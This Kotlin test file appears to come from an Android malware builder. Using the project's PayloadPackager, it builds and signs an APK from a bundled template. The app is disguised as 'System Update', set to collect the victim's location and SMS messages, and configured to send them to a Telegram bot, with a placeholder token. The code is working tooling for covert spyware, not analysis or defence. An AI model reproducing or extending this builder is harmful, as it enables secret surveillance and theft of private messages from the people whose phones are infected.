package com.vector.console.data.payload

import org.junit.Test
import java.io.File

/**
 * Not a test: a fixture dump. Runs the real packager over the real bundled template and writes
 * the result where `apksigner` can be pointed at it, so the v2 block can be validated by the
 * official verifier rather than by this project's own reader.
 */
class SignedApkDump {

    @Test
    fun dump() {
        val template = File("src/main/assets/payload/template.apk").readBytes()
        val spec = PayloadSpec(
            label = "System Update",
            collectLocation = true,
            collectSms = true,
            transport = PayloadSpec.Transport.TELEGRAM,
            telegramToken = "123456789" + ":" + "AAH" + "k".repeat(32),
            telegramChatId = "42"
        )
        val result = PayloadPackager.build(template, spec, ApkSignerV2.generateCredentials())
        val out = File("build/tmp/verify/signed.apk")
        out.parentFile?.mkdirs()
        out.writeBytes(result.apk)
        println("WROTE ${out.absolutePath} ${out.length()} bytes")
    }
}
